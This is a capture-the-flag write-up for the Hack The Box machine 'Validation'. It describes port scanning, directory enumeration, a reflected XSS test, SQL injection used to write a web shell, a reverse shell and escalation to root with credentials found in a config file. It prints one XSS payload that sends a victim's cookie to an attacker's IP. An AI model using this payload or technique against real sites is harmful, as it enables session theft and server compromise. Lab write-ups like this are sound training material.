# Validation Writeup - by Thammanant Thamtaranon  
- Validation is an easy Linux-based machine hosted on Hack The Box.

## Reconnaissance  
- We began with a full TCP port scan including service/version detection and OS fingerprinting:  
  `nmap -A -T4 -p- -Pn 10.10.11.116`  
  ![Nmap_Scan](Nmap_Scan.png)  
- The scan revealed the following open ports:  
  - **22** — SSH  
  - **80** — HTTP  
  - **4556** — HTTP  
  - **8080** — HTTP

## Scanning & Enumeration  
- Visiting port **80** served a web application.  
  ![80](80.png)  
- I performed a directory brute-force using `dirsearch`:  
  `dirsearch -u http://10.10.11.116`  
  ![Dirsearch_Scan](Dirsearch_Scan.png)  
- Accessing `/account.php` required registration prior to interaction.

## Exploitation  
- I tested for reflected XSS and it was successful.  
  ![XSS](XSS.png)  
- I adapted the payload to attempt cookie exfiltration:  
  `<script>new Image().src="http://10.10.16.4:4444?cookie="+document.cookie</script>`
- After waiting several minutes, we determined there was no external user or bot to trigger the payload, so the cookie was not captured via this vector.
- I then tested for SQL injection. The `country` parameter was vulnerable.  
  ![SQLi1](SQLi1.png)  
  ![SQLi2](SQLi2.png)  
  ![SQLi3](SQLi3.png)
- The table contents consisted of data we had submitted during registration and did not contain useful secrets.
- Using SQL injection, we were able to write a web shell to the server successfully.  
  ![SQLi4](SQLi4.png)
- I enter the web shell command with a reverse shell and started a listener on my machine. This yielded a shell as `www-data`.  
  ![www-data](www-data.png)
- From this context we retrieved the user flag.

## Privilege Escalation  
- While enumerating, we discovered `config.php`, which contained credentials for user `uhc`.  
  ![Config](Config.png)
- We attempted `su uhc`, but the `uhc` account did not exist on the system. We then attempted escalation to `root` and successfully obtained a root shell.  
- We validated root access and captured the root flag.  
  ![Root](Root.png)
